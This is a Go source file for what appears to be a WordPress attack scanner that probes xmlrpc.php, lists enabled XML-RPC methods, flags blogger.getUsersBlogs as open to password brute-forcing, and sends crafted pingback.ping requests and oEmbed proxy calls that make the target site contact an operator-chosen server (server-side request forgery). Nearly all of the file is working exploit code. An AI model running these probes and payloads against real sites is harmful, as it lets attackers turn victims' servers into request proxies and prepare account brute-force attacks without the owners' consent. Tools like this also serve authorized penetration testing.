package core

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
)

const header = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"

//SendReq Only send request
func SendReq(u string) string {
	c := &http.Client{}

	fmt.Printf("\n>> Sending request to: %s\n\n", u)
	req, err := http.NewRequest("GET", u, nil)
	req.Header.Add("User-Agent", header)
	resp, err := c.Do(req)

	if err != nil {
		log.Println(err)
	}

	defer resp.Body.Close()

	fmt.Println(">> Response code is: ", resp.StatusCode)

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Println(err)
	}

	bodyRequest := string(body)
	return bodyRequest

}

//TestListMethods test if pingback is allowed
func TestListMethods(url string) {

	body := "<methodCall> <methodName>system.listMethods</methodName> </methodCall>"
	c := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", header)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	resp, err := c.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	bodyString, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}

	b := string(bodyString)

	matchedStringPing, err := regexp.MatchString(`(<value><string>pingback.ping</string></value>)`, b)

	if err != nil {
		log.Println(err)
	}

	if matchedStringPing {
		fmt.Println("[+] Pingback open \\O/ Testing SSRF methods..")
	}

	matchedStringBrute, err := regexp.MatchString(`(<value><string>blogger.getUsersBlogs</string></value>)`, b)

	if err != nil {
		log.Println(err)
	}

	if matchedStringBrute {
		fmt.Println("[+] blogger.getUsersBlogs open this interface enable brute force attacks against users blogs")
	}

}

//TestSSRF testing SSRF with XMLRPC
func (s *Client) TestSSRF(server string) {

	url := s.target + "/xmlrpc.php"

	b := `
	<methodCall>
		<methodName>pingback.ping</methodName>
			<params>
				<param>
					<value><string>$SERVER$</string></value>
				</param>
				<param>
					<value><string>$TARGET$?p=1</string></value>
				</param>
			</params>
	</methodCall>`

	replaceServer := strings.ReplaceAll(b, "$SERVER$", server)
	replaceTarget := strings.ReplaceAll(replaceServer, "$TARGET$", s.target)

	body := replaceTarget

	c := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", header)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	resp, err := c.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	bodyString, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}

	bodyResponse := string(bodyString)
	fmt.Printf(">> Always look at your log server, and sometimes.. only DNS resolv works..\n\n")
	fmt.Println(bodyResponse)
}

//TestSSRFProxy tests if a proxy uses a oembed proxy poorly configured
func (s *Client) TestSSRFProxy(server string) {

	url := s.target + "/wp-json/oembed/1.0/proxy?url=" + server
	resp := SendReq(url)
	fmt.Printf(">> Response body is: %s\n\n", resp)
}

//Client just a struct :p
type Client struct {
	target string
}

//New returns a target struct
func New(t string) *Client {
	return &Client{target: t}
}

//XMLRPCTest tests XMLRPC interface
func (s *Client) XMLRPCTest() {

	xmlrpcPath := s.target + "/xmlrpc.php"

	responseBody := SendReq(xmlrpcPath)
	fmt.Printf(">> Response body is: %s\n\n", responseBody)

	matchedString, err := regexp.MatchString(`(XML-RPC server accepts POST requests only)`, responseBody)

	if err != nil {
		log.Println(err)
	}

	if matchedString {
		TestListMethods(xmlrpcPath)
	}
}
